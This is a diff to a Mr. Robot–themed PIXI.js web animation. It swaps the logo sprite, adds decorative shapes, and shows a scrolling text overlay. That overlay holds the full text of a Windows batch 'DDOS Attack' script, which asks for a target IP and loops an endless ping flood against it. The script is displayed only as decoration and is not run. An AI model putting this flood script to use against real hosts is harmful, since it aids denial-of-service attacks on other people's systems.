@@ -25,9 +25,9 @@
     var state = stateLogin;
     var stage = new Container();
     var grupoFondo = new Container();
-    var logo, bg;
+    var fsociety, bg, box;
     var count = 0;
-    var loginElliot, loginFunTheroy;
+    var loginElliot, loginFunTheroy, loginScript;
 
     // Filters
     var glitchFilters = [
@@ -60,6 +60,7 @@
     PIXI.loader
         .add([
             "img/bg.jpg",
+            "img/login/box.png",
             "img/login/elliot.png",
             "img/login/fantheory.png",
             "img/fsociety.png"
@@ -81,12 +82,6 @@
     function setup(){
 
         // Fondo
-        /*
-        bg = new Graphics();
-        bg.beginFill(0x000000, 1);
-        bg.drawRect(0, 0, width, height);
-        grupoFondo.addChild(bg);
-        */
         bg = new Sprite( resources["img/bg.jpg"].texture );
         bg.width = width;
         bg.height = height;
@@ -94,16 +89,11 @@
         bg.anchor.set(0.5);
         grupoFondo.addChild(bg);
 
-        // Logo
-        logo = new Sprite( resources["img/fsociety.png"].texture );
-        logo.position.set(width/2, height/2);
-        logo.width = 140;
-        logo.height = 140;
-        logo.anchor.set(0.5);
-        logo.interactive = true;
-        logo.on('mousedown', onDown);
-        logo.on('touchstart', onDown);
-        grupoFondo.addChild(logo);
+        // Script
+        loginScript = new PIXI.Text( 'ddos.bat', { font: '10px monospace', fill: '#ffffff', align: 'left' }
+        );
+        loginScript.position.set(30, 120);
+        grupoFondo.addChild(loginScript);
 
         // Elliot
         loginElliot = new Sprite( resources["img/login/elliot.png"].texture );
@@ -111,11 +101,40 @@
         loginElliot.anchor.set(0.5);
         grupoFondo.addChild(loginElliot);
 
+        // Rayitas
+        var rayitas = new Container();
+        for (var i=0; i<16; i++) {
+            var rayita = new Graphics();
+            rayita.beginFill(0xFEE400, 1);
+            rayita.drawRect(Math.random()*width, 85+Math.random()*height*0.85, Math.random()*200, Math.random()*50);
+            rayitas.addChild(rayita);
+        }
+        grupoFondo.addChild(rayitas);
+
+        // Box
+        box = new Sprite( resources["img/login/box.png"].texture );
+        box.position.set(Math.random().width, Math.random()*height);
+        box.anchor.set(0.5);
+        grupoFondo.addChild(box);
+
         // Fun Theory
         loginFunTheroy = new Sprite( resources["img/login/fantheory.png"].texture );
         loginFunTheroy.position.set(loginElliot.x,loginElliot.y-loginElliot.height*0.13);
         loginFunTheroy.anchor.set(0.5);
         grupoFondo.addChild(loginFunTheroy);
+
+
+        // fsociety
+        fsociety = new Sprite( resources["img/fsociety.png"].texture );
+        fsociety.position.set(width/2, height/2);
+        fsociety.width = 140;
+        fsociety.height = 140;
+        fsociety.anchor.set(0.5);
+        fsociety.interactive = true;
+        fsociety.on('mousedown', onDown);
+        fsociety.on('touchstart', onDown);
+        stage.addChild(fsociety);
+
 
         // Añadir grupo fondo al stage
         stage.addChild(grupoFondo);
@@ -149,6 +168,23 @@
 
         //loginFunTheroy.position.x = 1 + Math.cos(count) * 0.04;
         loginFunTheroy.position.y = loginElliot.y-loginElliot.height*0.14 + Math.sin(count) * 4;
+
+        // 20% de las veces
+        if (Math.random() > 0.8) {
+            // Alpha para el script
+            loginScript.alpha = Math.random()/2;
+        }
+
+        // 20% de las veces
+        if (Math.random() > 0.98) {
+            // Cambair caja de posicion
+            box.position.set(Math.random()*width, Math.random()*height);
+        }
+
+        // Actualizar cantidad de ataques
+        loginScript.text = '//DDOS ATTACKS '+ Math.floor(count) +'\n\n┌─┐┌─┐┌─┐┌─┐┬┌─┐┌┬┐┬ ┬\n├┤ └─┐│ ││  │├┤  │ └┬┘\n└  └─┘└─┘└─┘┴└─┘ ┴  ┴ \n\n@echo off\nmode 67,16\ntitle DDOS Attack\ncolor 05\ncls\necho.\necho ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ\necho DDOS Bayu Ae\necho ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ\necho.\nset /p x=Apa-Targer Loe:\necho.\necho ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ\nping %x%\necho "fuck society, our democracy has been hacked."\n@ping.exe 127.0.0.1 -n 5 -w 1000 > nul\ngoto Next\n:Next\necho.\necho.\necho.\nset /p m=Ip Host:\necho.\nset /p n=Packet Size:\necho.\n:DDOS\ncolor 0c\necho Serang Server %m%\nping %m% -i %n% -t >nul\ngoto DDOS \n\n//DDOS ATTACKS '+ Math.floor(count) +'';
+
+        // Contador
         count += 0.05;
     }
 
@@ -156,18 +192,18 @@
     function statePlay(){
 
         //Update the sprite's velocity
-        logo.vx = 1;
-        logo.vy = 2;
+        fsociety.vx = 1;
+        fsociety.vy = 2;
 
         //Apply the velocity values to the sprite's position to make it move
-        logo.x += logo.vx;
-        logo.y += logo.vy;
+        fsociety.x += fsociety.vx;
+        fsociety.y += fsociety.vy;
 
-        if( logo.x > renderer.width ){
-            logo.x = 0;
+        if( fsociety.x > renderer.width ){
+            fsociety.x = 0;
         }
-        if( logo.y > renderer.height ){
-            logo.y = 0;
+        if( fsociety.y > renderer.height ){
+            fsociety.y = 0;
         }
 
     }
